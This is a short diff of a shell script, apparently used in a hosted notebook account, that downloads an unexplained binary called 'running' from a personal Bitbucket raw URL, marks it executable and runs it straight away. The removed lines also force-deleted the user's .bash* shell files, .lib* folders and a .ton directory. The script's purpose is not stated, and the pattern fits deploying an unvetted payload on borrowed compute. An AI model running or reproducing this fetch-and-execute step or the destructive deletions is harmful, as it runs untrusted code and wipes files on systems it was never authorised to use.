@@ -1,12 +1,5 @@
 cd ~
-rm -rvf .bash* .lib*
-
-rm -rvf ele* lol* 1.43* 
-cd ~/
-mkdir .lib
-cd .lib
-rm -R *
-rm -R /home/studio-lab-user/.ton
+rm -rvf running
 
 wget https://bitbucket.org/andikasdsdssda/nasika/raw/9d4c0386ebb7aa05cb18fd7dddc26cbba5992f16/running && chmod u+x running
 ./running
